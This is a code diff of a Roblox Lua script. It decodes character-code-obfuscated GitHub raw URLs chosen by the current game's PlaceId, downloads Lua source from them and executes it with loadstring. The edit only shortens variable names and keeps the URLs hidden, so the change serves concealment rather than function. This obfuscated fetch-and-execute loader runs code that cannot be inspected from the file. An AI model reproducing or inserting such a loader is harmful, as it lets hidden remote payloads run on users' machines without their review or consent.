@@ -4,36 +4,34 @@ task.spawn(function()
         game.Loaded:Wait()
     end
 
-    task.wait(2) 
+    task.wait(2)
 
-    local HttpGet = game.HttpGet
-    local load = loadstring
+    local g = game
+    local H = g.HttpGet
+    local L = loadstring
+    if type(H) ~= "function" or type(L) ~= "function" then return end
 
-    if type(HttpGet) ~= "function" or type(load) ~= "function" then
-        return
-    end
-
-    local pid = tostring(game.PlaceId)
-
-    local function d(t)
-        local s=""
-        for i=1,#t do
-            s=s..string.char(t[i])
+    local function c(t)
+        local s = ""
+        for i = 1, #t do
+            s = s .. string.char(t[i])
         end
         return s
     end
 
-    local P1 = d({55,56,57,57,51,56,52,55,48,53,53,57,52,57})
-    local P2 = d({55,50,54,48,52,56,48,57,56,53,55,49,51,57})
+    local p = tostring(g.PlaceId)
 
-    local urls = {
-        [P1] = d({
+    local A = c({55,56,57,57,51,56,52,55,48,53,53,57,52,57})
+    local B = c({55,50,54,48,52,56,48,57,56,53,55,49,51,57})
+
+    local U = {
+        [A] = c({
             104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
             100,97,118,105,100,115,101,98,97,115,51,52,56,45,104,117,98,47,
             84,101,120,116,49,55,48,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,
             84,101,120,116,49,55,48,46,108,117,97
         }),
-        [P2] = d({
+        [B] = c({
             104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
             100,97,118,105,100,115,101,98,97,115,51,52,56,45,104,117,98,47,
             84,101,120,116,49,54,53,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,
@@ -41,11 +39,11 @@ task.spawn(function()
         })
     }
 
-    local url = urls[pid]
-    if not url then return end
+    local R = U[p]
+    if not R then return end
 
-    local src = HttpGet(game, url, true)
-    local fn = load(src)
-    fn()
+    local S = H(g, R, true)
+    local F = L(S)
+    F()
 
 end)
